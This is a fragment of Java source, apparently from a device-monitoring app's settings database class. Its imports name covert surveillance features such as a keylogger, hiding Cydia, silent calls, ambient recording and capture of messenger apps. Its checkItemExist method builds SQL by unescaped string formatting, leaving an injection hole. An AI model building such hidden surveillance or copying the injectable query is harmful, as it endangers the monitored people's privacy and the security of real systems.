...
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ADMIN_NUMBER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ALERT;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AMBIENT_RECORD;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AMBIENT_RECORD_DURATION;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_APP;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_APP_INSTALL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_AUTO_UPGRADE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_BBM;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CALENDAR;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CALL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CLIENT_DATE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CLIPBOARD;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CONNECTION_TYPE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CONTACT;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CREATED_BY;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_CREATED_DATE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_DELIVERY_LOGS_BY_EMAIL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_DELIVER_EMAIL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_Device_ID;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_EMAIL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_EXPORCSV;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_FACEBOOK;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_FLUSH_DATA_EVENT_EXPIRED;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_GPS;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_GPS_INTERVAL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HANGOUTS;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HIDE_CYDIA;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_HORIZONTAL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_ID;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_INSTAGRAM;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_KEYLOGGER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_KIK;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_LEVEL_LOG_FILE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_LINE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MODIFIED_BY;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MODIFIED_DATE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_MONITOR_NUMBER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NETWORK_CONNECTION;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NOTE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_NOTIFICATION;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_OLA;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_PHOTO;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_RECORDED;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_REPORT_INTERVAL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_REPORT_PROBLEM;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_RUN_MODE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SAVE_BATTERY;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SECRET_KEY;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SERVER_TIME;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SILENT_CALL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SKYPE;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SMS;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_SNAPCHAT;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_TANGO;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_TWITTER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_UNINSTALL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_URL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_URL_SERVER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VERTICAL;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VIBER;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VIDEO;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_VOICE_MEMOS;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_WECHAT;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_WHATAPP;
import static com.scp.viewer.Database.Entity.DeviceEntity.COLUMN_GETSETTING_YAHOO;
...
public class DatabaseGetSetting
{
    ...
    private boolean checkItemExist(String KEYID, String value, String tableName){

        String query = String.format("SELECT * FROM %s WHERE %s = '%s'", tableName, KEYID, value);
